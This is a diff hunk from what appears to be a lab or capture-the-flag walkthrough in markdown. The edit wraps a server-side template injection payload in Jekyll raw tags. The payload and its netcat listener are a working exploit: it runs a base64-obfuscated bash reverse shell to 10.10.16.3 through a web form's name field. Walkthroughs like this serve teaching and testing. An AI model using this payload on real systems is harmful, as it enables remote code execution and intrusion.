@@ -124,7 +124,7 @@ nc -nvlp 4444
 
 Then we construct  SSTI payload to deliver on site through the name field.
 ```
-{{config.__class__.__init__.__globals__['os'].popen('echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zLzQ0NDQgMD4mMQ===${IFS}|base64${IFS}-d|bash').read()}}
+{% raw %}{{config.__class__.__init__.__globals__['os'].popen('echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zLzQ0NDQgMD4mMQ===${IFS}|base64${IFS}-d|bash').read()}}{% endraw %}
 
 ```
 
